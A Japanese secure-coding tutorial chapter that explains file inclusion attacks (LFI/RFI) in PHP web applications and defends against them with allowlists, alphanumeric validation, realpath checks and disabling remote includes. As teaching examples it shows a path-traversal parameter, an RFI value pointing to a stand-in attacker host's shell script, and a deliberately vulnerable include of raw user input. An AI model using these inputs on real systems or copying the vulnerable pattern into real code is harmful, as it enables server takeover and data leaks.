# 安全なWebアプリケーションの作り方（第16章）

Webアプリでは、画面の部品や設定、共通処理を **別ファイルから読み込んで使う（インクルード）** ことがよくあります。第16章では、そのときに起きやすい **ファイルインクルード攻撃** と対策を解説します。

第13章の「ファイルアクセス」は、ファイルを **読む・書く** ことが中心でした。本章は、読み込んだファイルを **プログラムの一部として実行する** 点がポイントです。そのため、被害が情報漏洩にとどまらず、サイト改ざんやサーバー乗っ取りに発展しやすいです。

---

## 📎 インクルードにまつわる問題の概要

インクルードまわりには、主に次の問題があります。

| 問題 | 概要 |
|------|------|
| **ファイルインクルード攻撃** | 外部入力でインクルード先を操作され、意図しないファイルを読み込まされる |
| **Webサーバー内のファイル閲覧による情報漏洩** | 設定ファイルやソースコードなど、本来見せてはいけない内容が読まれる |
| **任意スクリプトの実行** | 攻撃者が用意したプログラムをサーバー上で動かされる |

### 日常生活での例え

- **正常なインクルード**: 「今日のメニュー表」だけを厨房から持ってきて、お客様に見せる
- **攻撃された場合**: 「メニュー表」の代わりに「金庫の設計図」や「厨房を勝手に動かす指示書」を持ってこさせられる

### なぜ危険か

インクルードは、単なるファイル表示ではなく、**アプリの処理の一部としてファイルを取り込む** 仕組みです。悪用されると、次のような被害が出ます。

```
・設定ファイルやソースコードの漏洩
・サイトの見た目や内容の改ざん
・不正な機能の実行（管理者権限の操作など）
・他サイトへの攻撃の踏み台にされる
```

---

## 💥 ファイルインクルード攻撃とは

**ファイルインクルード攻撃** とは、アプリがインクルードするファイル名やパスを、**外部からのパラメータで操作できる** ときに起きる攻撃です。

PHP の `include` / `require`、JSP の `include`、一部のテンプレートエンジンなど、「別ファイルを読み込んで実行・表示する」機能が対象になります。

攻撃には、大きく次の2種類があります。

| 種類 | 英語名 | 説明 |
|------|--------|------|
| **ローカルファイルインクルード** | LFI（Local File Inclusion） | サーバー内の既存ファイルを読み込ませる |
| **リモートファイルインクルード** | RFI（Remote File Inclusion） | 外部サーバー上のファイルを読み込ませる |

どちらも「インクルード先を攻撃者が決めてしまう」点が共通です。LFI は情報漏洩や、条件次第でコード実行につながり、RFI は攻撃用スクリプトを直接実行させやすいです。

### 日常生活での例え

- **正常**: 店員が「今日のランチメニュー（固定の紙）」だけを持ってくる
- **LFI**: 客が「メニュー番号」を指定でき、その番号で金庫の中身まで持ってこさせてしまう
- **RFI**: 客が「別の店から取り寄せた紙」まで厨房に持ち込ませ、その指示どおり厨房が動いてしまう

### 攻撃のイメージ

たとえば、ページの部品を切り替える機能が次のような URL だとします。

```
https://example.com/page.php?file=header
```

アプリが `file` パラメータをそのままインクルードしている場合:

```
【正常な利用】
file=header
→ /var/www/templates/header.php を読み込む（想定どおり）

【LFI の攻撃例】
file=../../config/database
→ /var/www/templates/../../config/database.php
→ データベース設定ファイルが読み込まれ、内容が漏洩する

【RFI の攻撃例（設定が許可している場合）】
file=http://evil.example.com/shell
→ 攻撃者のサーバー上のスクリプトを読み込み、サーバー上で実行される
```

第13章のディレクトリ・トラバーサルと似ていますが、違いは次のとおりです。

| 比較 | ディレクトリ・トラバーサル | ファイルインクルード |
|------|---------------------------|----------------------|
| **主な操作** | ファイルを読む・書く | ファイルを読み込んで **実行・組み込み** する |
| **典型的な被害** | 情報漏洩、改ざん | 情報漏洩に加え、任意コード実行になりやすい |
| **危険度のイメージ** | 金庫の中身を見られる | 金庫の中身を見られ、さらに金庫の鍵まで使われる |

## 📂 Webサーバー内のファイルの閲覧による情報漏洩

ローカルファイルインクルード（LFI）では、サーバー内のファイルを読み込ませることで **情報漏洩** が起きます。

### 何ができるか（被害）

| 漏洩しやすいもの | 危険な理由 |
|------------------|------------|
| **設定ファイル** | DB パスワード、API キー、秘密鍵などが含まれる |
| **ソースコード** | アプリのロジックや、別の脆弱性の手がかりが分かる |
| **ログファイル** | 個人情報、セッション情報、内部パスが残っていることがある |
| **OS の設定ファイル** | ユーザー一覧や環境情報が分かる（例: `/etc/passwd`） |

閲覧だけでも十分危険です。パスワードが分かれば、データベースや管理画面への不正ログインにつながります。

### 攻撃の流れ

```
1. 攻撃者が「インクルード先をパラメータで受け取る」機能を見つける
2. file=../../config/database のようにパスを操作した値を送る
3. アプリが入力値をそのまま include / require に使う
4. 「インクルードしてよいファイルか」のチェックがない
5. 設定情報・ソースコードなどが画面やレスポンスに出てしまう
```

### 脆弱なコードの例

```php
// ❌ 危険: 外部入力をそのままインクルードしている
$file = $_GET['file'];
include('/var/www/templates/' . $file . '.php');
```

```
リクエスト例:
  /page.php?file=../../config/database

実際に読み込まれるパス:
  /var/www/templates/../../config/database.php
  → /var/www/config/database.php
```

拡張子を `.php` で固定していても、`../` で別ディレクトリへ出られれば、サーバー内の PHP ファイルを読み込めてしまいます。PHP ファイル以外を狙う手口（ログ汚染など）もありますが、初心者のうちはまず **「外部入力でインクルード先を決めさせない」** ことを覚えれば十分です。

## ☠️ 任意スクリプトの実行による影響

インクルード攻撃がさらに進むと、**攻撃者が用意したスクリプトをサーバー上で実行される** ことがあります。特にリモートファイルインクルード（RFI）や、アップロード機能と組み合わせた LFI で起きやすいです。

スクリプトがサーバー上で動くと、Webアプリが持つ権限の範囲で、ほぼ何でもできます。代表的な影響は次のとおりです。

| 影響 | 説明 |
|------|------|
| **サイト改ざん** | トップページや商品情報を書き換え、偽情報や不正なリンクを載せる |
| **不正な機能実行** | 管理者だけができる操作（ユーザー削除、設定変更、送金など）を勝手に行う |
| **他サイトへの攻撃** | 自サーバーを踏み台にし、別のサイトへ攻撃する |

第14章の OSコマンド・インジェクションや、第15章のアップロードによるスクリプト実行と同様、**サーバーの乗っ取りに近い状態** になります。

### 1. サイト改ざん

攻撃者がサーバー上でファイルを書き換えられると、サイトの見た目や内容を自由に変えられます。

```
【起きうること】
・トップページに不正な広告やマルウェア配布リンクを埋め込む
・ログイン画面を偽画面に差し替え、パスワードを盗む
・商品価格やお知らせを改ざんし、利用者を騙す
```

利用者から見ると「いつものサイト」に見えるため、被害に気づきにくいです。

### 2. 不正な機能実行

アプリのソースコードや設定を読まれたあと、同じ権限で処理を実行されると、次のようなことが起きます。

```
【起きうること】
・管理者権限でのユーザー操作
・データベースの読み取り・書き換え・削除
・メール送信機能を使った迷惑メールの送信
・サーバー上での追加マルウェアの設置
```

「画面上のボタンを押す」のではなく、**サーバー内部から直接処理を動かす** ため、通常の画面上の権限チェックをすり抜けやすいです。

### 3. 他サイトへの攻撃

乗っ取られたサーバーは、攻撃者にとって便利な踏み台になります。

```
【起きうること】
・別サイトへの攻撃リクエストの送信
・迷惑メールやフィッシングメールの送信元になる
・ボットネットの一部として悪用される
```

自社サイトだけでなく、**他社や利用者にも被害が広がる** 点が深刻です。信頼を失い、場合によっては法的・契約上の問題にもつながります。

### 攻撃の流れ（任意スクリプト実行）

```
1. インクルード先を外部から指定できる機能がある
2. 攻撃者が悪意あるスクリプトを読み込ませる
   （外部 URL、アップロード済みファイル、細工したログなど）
3. サーバーがそのスクリプトをプログラムとして実行する
4. サイト改ざん・不正操作・他サイト攻撃などが可能になる
```

## 🔍 脆弱性が生まれる原因

ファイルインクルード攻撃は、次の条件がそろうと起きやすくなります。

| 原因 | 説明 |
|------|------|
| **インクルードファイル名を外部から指定できる** | URL やフォームのパラメータで、読み込むファイルを受け取っている |
| **インクルードすべきファイルかどうかの妥当性をチェックしていない** | 許可リストや文字種の制限がなく、`../` や外部 URL が通ってしまう |

特に危険なのは、**「ユーザーが指定した名前のファイルを include する」** という仕様そのものです。

よくある実装例:

```
・言語切り替え: ?lang=ja → include("lang/ja.php")
・テーマ切り替え: ?theme=dark → include("themes/dark.php")
・ページ部品の切り替え: ?page=about → include("pages/about.php")
```

便利に見えますが、パラメータをそのままパスに使うと攻撃対象になります。

## 🛡️ ファイルインクルード攻撃の対策

対策の基本は次の2つです。

| 対策 | 安全性 | 説明 |
|------|--------|------|
| **インクルードするパス名に外部からのパラメータを含めない** | 最も安全 | そもそも外部入力でファイルを選ばせない |
| **どうしても含める場合は、英数字に限定する** | 安全寄り | `../` や URL、記号を入れにくくする |

### 1. 外部からファイル名を指定する仕様を避ける（最優先）

いちばん安全なのは、**インクルード先を外部入力で決めない** ことです。

```php
// ✅ 安全: インクルード先はアプリ側で固定
include('/var/www/templates/header.php');
include('/var/www/templates/footer.php');
```

「ページを切り替えたい」「言語を変えたい」場合も、ファイル名そのものではなく、**アプリ内の ID やキー** を受け取り、対応表（許可リスト）でファイルを決める方法が安全です。

```php
// ✅ 安全: 外部入力はキーだけ。実ファイルは許可リストで決める
$pages = [
    'home'  => '/var/www/templates/home.php',
    'about' => '/var/www/templates/about.php',
    'contact' => '/var/www/templates/contact.php',
];

$key = $_GET['page'] ?? 'home';

if (!isset($pages[$key])) {
    exit('不正なページです');
}

include($pages[$key]);
```

```
【ポイント】
・ユーザーが送るのは "home" や "about" のような識別子だけ
・実際のパスはサーバー側の配列（許可リスト）が決める
・リストにない値はすべて拒否する
```

この方法なら、`../../config/database` のような値を送られても、許可リストに存在しないため読み込まれません。

### 2. ファイル名を英数字に限定する

どうしてもファイル名の一部を外部から受け取る必要がある場合は、**使える文字を英数字だけに限定** します。必要なら `_` や `-` も許可しますが、`/` `.` `:` などは入れない方が安全です。

```php
// ✅ 英数字のみ許可（../ や URL を入れにくくする）
$file = $_GET['file'] ?? '';

if (!preg_match('/\A[a-zA-Z0-9]+\z/', $file)) {
    exit('不正なファイル名です');
}

// 許可されたディレクトリ配下の、決まった拡張子だけを読む
$path = '/var/www/templates/' . $file . '.php';

// さらに、解決後のパスが想定ディレクトリ内か確認する
$realBase = realpath('/var/www/templates');
$realPath = realpath($path);

if ($realPath === false || !str_starts_with($realPath, $realBase . DIRECTORY_SEPARATOR)) {
    exit('不正なファイル名です');
}

include($realPath);
```

| チェック | 狙い |
|----------|------|
| **英数字のみ** | `../`、`/`、`http://` などを拒否する |
| **拡張子をサーバー側で付与** | 利用者が任意の拡張子を指定できないようにする |
| **realpath でディレクトリ確認** | 記号制限をすり抜けた場合の保険 |

ただし、英数字限定だけでは不十分なケースもあります。たとえば `file=config` のように、同じディレクトリ内の別ファイルを指定できてしまう場合です。そのため、**可能なら許可リスト方式を優先** し、英数字限定は補助的な対策と考えるのがよいです。

### 対策の優先順位

```
1. そもそも外部入力でインクルード先を決めない
2. 決める必要があるなら、許可リスト（対応表）でファイルを選ぶ
3. どうしても名前を受け取るなら、英数字に限定し、ディレクトリ内か確認する
4. リモートファイルのインクルード機能は無効化する（言語・フレームワークの設定）
```

PHP では、昔の設定でリモートファイルの include が有効な環境がありました。現在の既定では無効なことが多いですが、古いサーバーや設定変更後の環境では確認が必要です。

```
【確認しておきたい設定の例（PHP）】
allow_url_include = Off   ← リモートファイルの include を禁止
allow_url_fopen  = Off    ← 可能なら Off（影響範囲を見て判断）
```

## 📋 まとめ

| 項目 | 内容 |
|------|------|
| **攻撃名** | ファイルインクルード攻撃（LFI / RFI） |
| **本質** | インクルード先を外部から操作され、意図しないファイルを読み込み・実行される |
| **主な被害** | 情報漏洩、サイト改ざん、不正な機能実行、他サイトへの攻撃 |
| **原因** | 外部からファイル名を指定できる / 妥当性チェックがない |
| **対策** | 外部からファイル名を指定しない。やむを得ない場合は英数字限定＋許可リスト |

```
インクルード安全の基本:

1. インクルードするパス名に、外部からのパラメータを含めない
2. どうしても含める場合は、許可リストで実ファイルを決める
3. ファイル名を受け取るなら英数字に限定し、想定ディレクトリ内か確認する
4. リモートからのインクルードは無効化する
```

第13章のディレクトリ・トラバーサル対策と共通する考え方です。違いは、インクルードでは **読んだファイルがプログラムとして動く** ため、被害が一気に大きくなる点です。「便利だからパラメータでファイルを切り替える」設計は、セキュリティ上とても危険だと覚えておきましょう。
